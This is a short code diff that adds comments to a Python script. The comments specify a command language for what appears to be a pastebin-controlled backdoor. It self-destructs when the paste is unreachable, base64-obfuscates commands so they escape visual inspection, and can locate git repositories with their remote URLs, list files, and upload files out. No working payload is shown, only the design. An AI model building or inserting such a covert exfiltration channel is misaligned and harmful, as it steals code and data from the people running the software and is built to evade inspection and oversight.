@@ -3,6 +3,16 @@ import sys
 
 import argparse
 
+# # Command language details
+# Pastebin unavailable 3 consecutive pulls in a row: self-destruct
+# Path supports ~ expansion but not globbing
+# Commands are line-delimited
+# Obfuscate input with base64, which is easily decodable but which prevents visual inspection
+# “url [slug]”: Replace URL paste ID with a new paste ID, at most once per command
+# “find git [path]”: Searches for git repositories, and returns filesystem directories+remote URLs
+# “list [path]”: Lists files at path
+# “upload [path]”: Uploads file or directory, errors out if total upload would be over 128KB, at most once per command
+
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("--new_url_slug", default=None)
